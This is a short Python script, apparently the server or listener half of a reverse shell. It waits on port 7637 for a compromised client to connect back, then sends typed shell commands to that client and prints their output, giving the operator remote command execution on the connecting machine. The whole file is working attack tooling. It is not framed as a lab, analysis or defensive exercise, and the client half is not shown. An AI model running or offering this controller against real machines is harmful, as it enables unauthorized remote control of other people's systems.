import socket
from colorama import init, Fore, Style


# Initialize the colorama module
init()

SERVER_HOST = "127.0.0.1" # change it with your ip
SERVER_PORT = 7637
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
print("")

while True:
    # get the command from prompt
    command = input(Fore.BLUE + f"{cwd} $> ")
    if not command.strip():
        continue

    
    client_socket.send(command.encode())
    
    if command.lower() == "exit":
        break 

    
    output = client_socket.recv(BUFFER_SIZE).decode()
    print(Fore.YELLOW + output)
    

client_socket.close()
s.close()